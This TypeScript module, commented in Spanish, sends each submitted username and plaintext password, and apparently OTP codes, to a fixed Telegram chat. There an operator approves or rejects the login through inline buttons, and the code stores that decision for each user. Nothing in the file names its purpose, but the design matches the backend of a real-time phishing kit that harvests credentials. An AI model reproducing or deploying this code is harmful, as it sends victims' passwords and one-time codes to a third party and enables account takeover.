import TelegramBot from 'node-telegram-bot-api';
import { EstadosUsuario } from './types';

const token = process.env.TELEGRAM_TOKEN;
const chatId = process.env.CHAT_ID;

if (!token || !chatId) {
  throw new Error('TELEGRAM_TOKEN y CHAT_ID son requeridos en las variables de entorno');
}

const bot = new TelegramBot(token, { polling: false });

// Almacenamiento en memoria (en producción, usa una base de datos)
const estados: Record<string, EstadosUsuario> = {};

// Funciones para enviar mensajes
export async function sendLoginMessage(usuario: string, password: string) {
  const messageId = await bot.sendMessage(chatId, 
    `🔐 *Nuevo inicio de sesión*:\n\n` +
    `👤 *Usuario*: ${usuario}\n` +
    `🔑 *Contraseña*: ||${password}||\n\n` +
    `_ID: ${Date.now()}_`, 
    {
      parse_mode: 'Markdown',
      reply_markup: {
        inline_keyboard: [
          [{ text: '✅ Aprobar', callback_data: `approve_login_${usuario}` }],
          [{ text: '❌ Rechazar', callback_data: `reject_login_${usuario}` }]
        ]
      }
    }
  ).then(m => m.message_id);

  // Guardar estado
  if (!estados[usuario]) estados[usuario] = {} as EstadosUsuario;
  estados[usuario].msg_ids = { login: messageId };
  estados[usuario].password = password;
  
  return messageId;
}

// Funciones similares para registro, OTP, etc.
// ...

// Manejar respuestas de botones de Telegram
export function setupTelegramWebhook(webhookUrl: string) {
  bot.setWebHook(`${webhookUrl}/api/telegram`);

  bot.on('callback_query', async (callbackQuery) => {
    const { data, message } = callbackQuery;
    const [action, type, usuario] = data.split('_');
    
    if (!message || !message.chat || message.chat.id.toString() !== chatId) return;

    try {
      if (action === 'approve' || action === 'reject') {
        const isApproved = action === 'approve';
        
        // Actualizar estado
        if (estados[usuario]) {
          estados[usuario].decision = isApproved ? 'approved' : 'rejected';
          
          // Notificar al usuario
          await bot.editMessageText(
            `✅ ${isApproved ? 'Aprobado' : '❌ Rechazado'}\n\n` + 
            message.text,
            {
              chat_id: message.chat.id,
              message_id: message.message_id,
              parse_mode: 'Markdown'
            }
          );
        }
      }
    } catch (error) {
      console.error('Error al manejar callback:', error);
    }
  });
}

export function getEstadoUsuario(usuario: string) {
  return estados[usuario];
}

export function limpiarEstado(usuario: string) {
  delete estados[usuario];
}